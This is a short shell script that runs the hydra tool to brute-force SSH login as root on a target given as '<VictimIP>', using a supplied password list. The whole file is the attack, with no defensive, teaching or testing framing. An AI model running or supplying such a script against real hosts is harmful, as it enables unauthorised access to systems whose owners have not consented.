#!/bin/sh

INT=wlan0

if [ $# -ne 2 ]
then
        echo "USAGE: $0 <VictimIP> <Passwords.txt>"
        exit 1
fi


/usr/bin/hydra -l root -P $2 -t 2 $1 ssh
